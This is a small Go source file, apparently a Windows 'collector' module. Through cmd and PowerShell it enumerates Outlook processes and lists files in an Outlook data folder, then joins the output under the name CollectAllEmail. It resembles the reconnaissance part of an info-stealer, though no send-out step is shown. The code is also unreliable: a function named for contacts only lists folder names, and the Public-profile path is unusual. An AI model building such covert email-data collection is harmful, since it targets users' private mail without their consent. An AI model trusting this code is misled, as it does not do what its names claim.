//go:build windows

package collector

import (
"os/exec"
)

func CollectEmailData() string {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Get-Process Outlook -ErrorAction SilentlyContinue | Select-Object -Property Name,Id\"")
output, err := cmd.Output()
if err != nil {
return ""
}
return string(output)
}

func CollectEmailContacts() string {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Get-ChildItem 'C:\\Users\\Public\\AppData\\Local\\Microsoft\\Outlook' -ErrorAction SilentlyContinue | Select-Object -Property Name\"")
output, err := cmd.Output()
if err != nil {
return ""
}
return string(output)
}

func CollectOutlookFiles() string {
cmd := exec.Command("cmd", "/c", "dir /s /b C:\\Users\\Public\\AppData\\Local\\Microsoft\\Outlook")
output, err := cmd.Output()
if err != nil {
return ""
}
return string(output)
}

func CollectAllEmail() string {
var result string
result += CollectEmailData()
result += CollectEmailContacts()
result += CollectOutlookFiles()
return result
}
